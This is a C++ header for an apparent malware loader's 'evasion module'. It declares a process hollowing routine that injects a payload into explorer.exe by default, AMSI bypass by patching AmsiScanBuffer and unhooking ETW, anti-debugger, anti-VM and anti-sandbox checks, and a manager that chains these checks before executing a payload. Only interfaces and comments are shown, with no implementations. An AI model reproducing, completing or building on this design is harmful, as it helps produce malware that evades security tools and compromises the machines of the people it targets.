// Moz Crypto Core - Evasion Module
// Implements process hollowing, AMSI bypass, anti-analysis techniques

#ifndef MOZ_EVASION_H
#define MOZ_EVASION_H

#include <string>
#include <vector>
#include <cstdint>

namespace moz {

// ==================== Process Hollowing ====================
// Technique T1055.012 - Process Hollowing (RunPE)
// Launches a legitimate process in suspended state, then replaces its
// memory with malicious payload before execution.
class ProcessHollowing {
public:
    // Execute payload via process hollowing
    // Returns PID of the hollowed process if successful
    static uint32_t executeViaHollowing(const std::vector<uint8_t>& payload,
                                        const std::string& targetProcess);
    
    // Execute payload via process hollowing with custom process
    static uint32_t executeViaHollowing(const std::string& payloadPath,
                                        const std::string& targetProcess);
    
    // Check if process hollowing is available on this platform
    static bool isAvailable();
    
private:
    // Windows API stubs (will be dynamically loaded on Windows)
    static bool hollowViaWinAPI(const std::vector<uint8_t>& payload,
                                const std::string& targetProcess);
    
    static bool hollowViaWinAPI(const std::string& payloadPath,
                                const std::string& targetProcess);
};

// ==================== AMSI Bypass ====================
// Bypasses Windows Antimalware Scan Interface (AMSI)
// Techniques documented: patching AmsiScanBuffer, using CLR unhook
class AMSIBypass {
public:
    // Attempt to bypass AMSI by patching AmsiScanBuffer
    static bool bypassAmsiPatching();
    
    // Bypass AMSI by disabling CLR hooks
    static bool bypassClrUnhook();
    
    // Check if AMSI is active
    static bool isAmsiActive();
    
private:
    // Find and patch AmsiScanBuffer in memory
    static bool patchAmsiScanBuffer();
    
    // Unhook ETW and AMSI providers
    static bool unhookProviders();
};

// ==================== Anti-Analysis ====================
// Anti-debugging and anti-VM/sandbox detection
class AntiAnalysis {
public:
    // Anti-debugging checks
    static bool isDebuggerPresent();
    static bool checkRemoteDebugger();
    static bool checkHeapFlags();
    static bool checkDebugObject();
    static bool checkNtGlobalFlag();
    
    // Anti-VM checks
    static bool isVirtualMachine();
    static bool checkHypervisor();
    static bool checkHardwareConstants();
    static bool checkTimingAnomalies();
    
    // Combined check - returns true if analysis is detected
    static bool isBeingAnalyzed();
    
    // Anti-sandbox checks
    static bool isSandbox();
    
private:
    // CPUID-based hypervisor detection
    static bool checkCpuidHypervisor();
    
    // RDTSC timing check
    static bool checkRdtscDelta();
    
    // PEB-based checks
    static bool checkPebFlags();
};

// ==================== Evasion Manager ====================
// Orchestrates all evasion techniques
class EvasionManager {
public:
    EvasionManager();
    ~EvasionManager();
    
    // Run all anti-analysis checks
    bool runAntiAnalysis() const;
    
    // Apply AMSI bypass
    bool applyAMSIBypass() const;
    
    // Execute payload through process hollowing
    bool executeThroughHollowing(const std::vector<uint8_t>& payload,
                                 const std::string& targetProcess = "explorer.exe") const;
    
    // Combined: run evasion then execute
    bool runEvasionAndExecute(const std::vector<uint8_t>& payload,
                              const std::string& targetProcess = "explorer.exe") const;
    
    // Configuration
    void setForceEvasion(bool enable) { force_evasion_ = enable; }
    void setVerbose(bool enable) { verbose_ = enable; }
    void addTargetProcess(const std::string& proc) { target_processes_.push_back(proc); }
    
private:
    bool force_evasion_ = true;
    bool verbose_ = false;
    std::vector<std::string> target_processes_;
    
    void log(const std::string& message) const;
};

} // namespace moz

#endif // MOZ_EVASION_H
